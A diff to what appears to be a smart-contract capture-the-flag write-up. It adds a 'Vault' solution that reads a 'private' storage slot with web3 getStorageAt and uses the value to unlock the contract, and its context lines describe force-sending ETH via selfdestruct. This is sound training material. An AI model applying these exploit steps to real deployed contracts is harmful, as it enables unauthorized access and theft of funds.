@@ -48,3 +48,10 @@ await contract.sendTransaction({ data: web3.eth.abi.encodeFunctionSignature("pwn
 See solidity function [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/).  
 Compile [ForcePay.sol](./solutions/ForcePay.sol) and deploy it to the Rinkeby testnet with at least 0.001 ETH.
 Afterwards, just call the `destroyAndLeaveBalanceAt(address _contract)` function with the level `instance` address as first argument.
+
+## 8. Vault
+
+```
+const password = await web3.eth.getStorageAt(instance, 1); // get storage variable at index 1 of contract (although it's private!)
+await contract.unlock(password);
+```
